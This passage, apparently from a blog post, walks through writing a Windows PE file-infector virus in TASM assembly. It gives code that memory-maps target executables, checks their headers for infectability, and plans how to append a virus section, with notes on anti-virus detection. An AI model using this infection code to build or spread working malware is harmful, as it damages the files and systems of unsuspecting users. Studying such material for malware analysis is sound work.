+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jle</span> error
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Create a read/write file mapping for the entire targetFile</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, [targetFileHandle]
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> CreateFileMappingA, \
+</span></span><span style=display:flex><span>         eax,\                 <span style=color:#75715e>; file handle</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>,\                  <span style=color:#75715e>; sec attributes (not used)</span>
+</span></span><span style=display:flex><span>         PAGE_READWRITE,\      <span style=color:#75715e>; attributes</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>,\                  <span style=color:#75715e>; size high</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>,\                  <span style=color:#75715e>; size low</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>                    <span style=color:#75715e>; name (null for no name)</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> findnext
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [targetMapHandle], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Map the entire targetFile into memory</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> MapViewOfFile, \
+</span></span><span style=display:flex><span>    eax,\                      <span style=color:#75715e>; mapping object handle</span>
+</span></span><span style=display:flex><span>    FILE_MAP_WRITE,\           <span style=color:#75715e>; access</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0h</span>,\                       <span style=color:#75715e>; offset high</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0h</span>,\                       <span style=color:#75715e>; offset low</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0h</span>                         <span style=color:#75715e>; number of bytes to map (0 for all)</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> findnext
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [targetP], eax
+</span></span></code></pre></td></tr></table></div></div><h2 id=offsets-to-check>Offsets to check <a href=#offsets-to-check class=anchor>🔗</a></h2><p>With the file memory mapped it&rsquo;s possible to check whether it can be infected by examining key offsets within the DOS and PE headers. Initially when I was looking at example PE infector source code from this era I found most were using numeric offsets as magic numbers throughout the code. For example, here&rsquo;s one snippet I found that copies the file and section alignment from a PE header using numeric offsets:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; falignvalue will contain the FileAlignment</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; and salignvalue will contain the SectionAlignment</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, [ebx <span style=color:#f92672>+</span> <span style=color:#ae81ff>3Ch</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [ebp <span style=color:#f92672>+</span> falignvalue], eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, [ebx <span style=color:#f92672>+</span> <span style=color:#ae81ff>38h</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [ebp <span style=color:#f92672>+</span> salignvalue], eax
+</span></span></code></pre></td></tr></table></div></div><p>I&rsquo;m not sure if this is because programmers were often ripping working assembly from viruses found in the wild missing source level context or if it was just how people did it at the time. Either way I found it made code that was difficult to
+read.</p><p>Life was much easier when I used my assembler&rsquo;s ability to define structures. <code>TASM</code>/<code>MASM</code> both support the <code>STRUCT</code> keyword for this. If there was a <code>STRUCT</code> for the PE header and its optional header then the section and file alignment fields could be accessed without using numeric offsets like <code>0x3C</code> and <code>0x38</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; falignvalue will contain the FileAlignment</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; and salignvalue will contain the SectionAlignment</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_NT_HEADERS [ebx]).OptionalHeader.FileAlignment
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [ebp <span style=color:#f92672>+</span> falignvalue], eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_NT_HEADERS [ebx]).OptionalHeader.SectionAlignment
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [ebp <span style=color:#f92672>+</span> salignvalue], eax
+</span></span></code></pre></td></tr></table></div></div><p>I found that the <a href=http://www.masm32.com/ target=_blank rel=noopener>MASM32 distribution</a> came with a great <code>windows.inc</code> file that contained many predefined structure definitions, including the ones most important for PE manipulation: <code>IMAGE_DOS_HEADER</code> and <code>IMAGE_NT_HEADERS</code>.</p><p>One thing I noticed was that the <code>windows.inc</code> field names didn&rsquo;t always match up to the PE docs exactly (e.g. <code>SecHdrVirtualAddress</code> vs <code>VirtualAddress</code>). The reason for this is because <code>MASM</code> (and <code>TASM</code> in compatibility mode) doesn&rsquo;t locally scope names within <code>STRUCT</code>s, meaning there can be only one structure field named <code>VirtualAddress</code> across all <code>STRUCT</code>s. If another <code>STRUCT</code> needs a field for a similar purpose it can&rsquo;t use the same name and has to add a prefix (e.g. Using <code>SecHdr</code> for the section header <code>STRUCT</code> field because <code>Hdr</code> is already in use elsewhere).</p><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/image.optional.header.struct.jpg><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/image.optional.header.struct_hue9f9c6219440acd3e60ac4ed630884a5_66827_400x0_resize_q75_h2_box.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/image.optional.header.struct_hue9f9c6219440acd3e60ac4ed630884a5_66827_600x0_resize_q75_h2_box.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/image.optional.header.struct_hue9f9c6219440acd3e60ac4ed630884a5_66827_800x0_resize_q75_h2_box.webp><img alt="Struct definition screenshot" title="Struct definition screenshot" src=image.optional.header.struct.jpg loading=lazy class=img-fluid></picture></a><figcaption>Example IMAGE_OPTIONAL_HEADERS struct</figcaption></figure></p></p><p>For this project I needed to check each target file for following things to decide if it could be infected:</p><ol><li>There should be an <code>IMAGE_DOS_HEADER</code> <a href=https://en.wikipedia.org/wiki/DOS_MZ_executable target=_blank rel=noopener>DOS MZ header</a> at the very start of the file.</li><li>The <code>e_lfanew</code> pointer from the <code>IMAGE_DOS_HEADER</code> should point to an <code>IMAGE_NT_HEADERS</code> PE header.</li><li>The <code>IMAGE_NT_HEADERS</code>&rsquo; <code>OptionalHeader</code>&rsquo;s <code>Subsystem</code> field should be the value for the Windows GUI or Windows CUI subsystem (e.g. a graphical or command line Windows program).</li><li>The <code>IMAGE_NT_HEADERS</code>&rsquo; <code>FileHeader</code>&rsquo;s <code>Machine</code> field should be the value for the <code>i386</code> architecture.</li><li>There shouldn&rsquo;t be an <code>IMAGE_SECTION_HEADER</code> present with the same name as the virus code section present (or it&rsquo;s already infected).</li><li>There should be enough space for an additional <code>IMAGE_SECTION_HEADER</code> to be added.</li></ol><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `targetP`        -&gt; a pointer to the start of the memory mapped </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                               target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetFileSize` -&gt; the size of the target .exe on disk (lower</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                               bound)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `eax`            -&gt; pointer to the start of `IMAGE_NT_HEADERS` in</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                               an infectable target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; With the target EXE mapped into memory we can start checking it out</span>
+</span></span><span style=display:flex><span>@@checkdosheader:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, [targetP]
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Check that we have a DOS header by looking for the IMAGE_DOS_SIGNATURE</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; (the magic MZ bytes) at the expected offset</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> (IMAGE_DOS_HEADER [eax]).e_magic, IMAGE_DOS_SIGNATURE
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jnz</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Advance past the end of the IMAGE_DOS_HEADER structure to the</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; IMAGE_NT_HEADERS</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>add</span> eax, (IMAGE_DOS_HEADER [eax]).e_lfanew
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Check that the offset specifed by e_lfanew isn&#39;t out of bounds for the </span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; file size</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ecx, eax
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>sub</span> ecx, [targetP]
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> ecx, [targetFileSize]
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jge</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Check that there is enough room for an IMAGE_NT_HEADER</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>add</span> ecx, size IMAGE_NT_HEADERS
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> ecx, [targetFileSize]
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jge</span> findnext
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>@@checkpeheader:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Check that we have a PE header by looking for the right magic</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; bytes (PE) at the expected offset</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> (IMAGE_NT_HEADERS [eax]).Signature, IMAGE_NT_SIGNATURE
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jnz</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@@checksubsystem:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; We only want to infect GUI or Console apps, not device drivers, </span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; WinCE apps, etc</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_GUI
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jz</span> @@checkmachine
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_CUI
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jnz</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@@checkmachine:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; We need to verify the PE is targetting a i386 machine.</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> (IMAGE_NT_HEADERS [eax]).FileHeader.Machine, IMAGE_FILE_MACHINE_I386
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jnz</span> findnext
+</span></span></code></pre></td></tr></table></div></div><h1 id=adding-virus-code>Adding virus code <a href=#adding-virus-code class=anchor>🔗</a></h1><p>There are lots of ways to add new virus code to an existing PE executable. Three common ways I considered were:</p><ol><li>Adding the virus code in one piece in the unused padding of an existing code section.</li><li>Breaking the virus code into pieces and putting those pieces in unused space found in an existing code section.</li><li>Adding the virus code as a whole new code section.</li></ol><p>Option 1 is straight forward but could mean some target files won&rsquo;t have enough space to be infected. PE code sections are usually aligned on disk by <code>0x200</code> bytes (the actual alignment is specified in the PE header), meaning that in the best case if an existing code segment were <code>0x201</code> bytes before being aligned with padding the virus could be up to <code>0x1FF</code> bytes. In the worst case if the existing code segment was exactly <code>0x200</code> bytes before alignment then there would be 0 bytes left for an infection! Since I wasn&rsquo;t sure what an &ldquo;average&rdquo; amount of padding was for executables from this era, or how big my virus would eventually be I decided not to pursue this approach to start with.</p><p>Option 2 is more complex but can make better use of free space in places other than the section padding. The complexity involved in breaking up the virus code into little segments and connecting them up at run-time was too much to make this a good choice when I was just starting out.</p><p>Option 3 is what I settled on. This option gave me freedom to make my virus as big as I wanted and looked like a good place to start. The only space constraint this approach has is making sure that there is enough room in the PE header for one new section metadata entry.</p><p>The downsides of this approach relate to anti-virus. Putting it bluntly adding a new section is not subtle. You can identify whether a file is infected or not based on the presence of the new section (in fact that&rsquo;s how I prevent reinfection). You could even &ldquo;inoculate&rdquo; files against infection by adding a benign section with the same name as the virus section. Unlike options 1 and 2, this option also changes the infected file&rsquo;s size on disk. Lastly, from an AV perspective it&rsquo;s easy to disinfect infected programs by restoring the original entry point and deleting the malicious segment. Since I was mostly unconcerned with AV these downsides were acceptable.</p><p>At a high level adding a new section means:</p><ol><li>Increasing the <code>NumberOfSections</code> <code>WORD</code> in the <code>IMAGE_NT_HEADERS</code>&rsquo; <code>FileHeader</code>.</li><li>Finding the end of the <code>IMAGE_SECTION_HEADERS</code> array and adding one more entry.</li><li>Calculating the correct <code>VirtualSize</code>, <code>SecHdrVirtualAddress</code>, <code>SizeOfRawData</code> and <code>PointerToRawData</code> for the new <code>IMAGE_SECTION_HEADER</code>.</li><li>Setting the correct <code>SecHdrCharacteristic</code> flag for the new <code>IMAGE_SECTION_HEADER</code>.</li></ol><p>Increasing the <code>NumberOfSections</code> is self explanatory. Finding the end of the <code>IMAGE_SECTION_HEADERS</code> array requires some math. The start of this array is always immediately after the end of the base PE <code>IMAGE_NT_HEADERS</code> structure. I knew where the start of the PE structure is (the <code>e_lfanew</code> pointer from the <code>IMAGE_DOS_HEADER</code>) and I knew the size of the <code>IMAGE_NT_HEADERS</code> structure. That gives me the end of the PE structure and the start of the <code>IMAGE_SECTION_HEADER</code> array. I can calculate the offset to the end of the array by multiplying <code>NumberOfSections</code> by the size of each <code>IMAGE_SECTION_HEADER</code> structure.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `eax`              -&gt; pointer to the start of `IMAGE_NT_HEADERS`</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                 in the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `numberOfSections` -&gt; number of sections in the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `segHeaders`       -&gt; pointer to the start of the</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                `IMAGE_SECTION_HEADER`s in the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `lastSegHeader`    -&gt; pointer to the start of the last</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                `IMAGE_SECTION_HEADER` in the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Copy down how many sections the target PE has</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
+</span></span><span style=display:flex><span><span style=color:#a6e22e>movzx</span> ecx, cx
+</span></span><span style=display:flex><span><span style=color:#75715e>; If there are zero sections, something is off, move on</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>cmp</span> ecx, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>je</span> findnext
+</span></span><span style=display:flex><span><span style=color:#75715e>; Save the number of sections</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [numberOfSections], ecx
+</span></span><span style=display:flex><span>
